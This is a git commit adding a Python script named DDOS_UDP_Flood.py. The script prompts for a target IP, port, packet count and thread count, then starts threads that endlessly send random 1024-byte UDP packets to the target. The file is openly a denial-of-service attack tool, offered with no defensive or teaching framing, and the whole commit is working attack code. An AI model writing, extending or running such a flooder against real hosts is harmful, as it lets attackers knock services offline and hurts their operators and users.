b663ea96b70abb9c9ee5b43e577663e5f07304bc
Jitu Rajak <83398258+FCJ6202@users.noreply.github.com>
2022-10-14 01:35:45 +0530

    Add DDOS File

---
+++ DDOS_UDP_Flood.py
@@ -0,0 +1,30 @@
+import socket
+import random
+import threading
+
+print("\033[1;32;40m ==> DDOS Attack <==  \n")
+ip = str(input(" Host/Ip:"))
+port = int(input(" Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Packets per one connection:"))
+threads = int(input(" Threads:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +"UDP Sent!!!")
+		except:
+			s.close()
+			print("[!] Error!!!")
+
+
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
